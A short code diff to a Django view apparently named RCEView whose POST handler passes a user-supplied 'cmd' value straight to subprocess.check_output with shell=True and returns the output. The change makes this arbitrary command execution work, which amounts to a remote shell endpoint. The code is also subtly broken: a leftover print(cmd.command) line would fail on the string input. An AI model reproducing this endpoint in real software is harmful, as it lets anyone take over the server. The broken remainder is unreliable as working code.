@@ -26,7 +26,7 @@ class RCEView(View):
     def post(self, request, *args, **kwargs):
         cmd = request.POST.get('cmd')
         try:
-            output = subprocess.check_output(cmd.command, shell=True, text=True)
+            output = subprocess.check_output(cmd, shell=True, text=True)
             print(cmd.command)
             return JsonResponse({"output": output}, status=200)
         except subprocess.CalledProcessError as e:
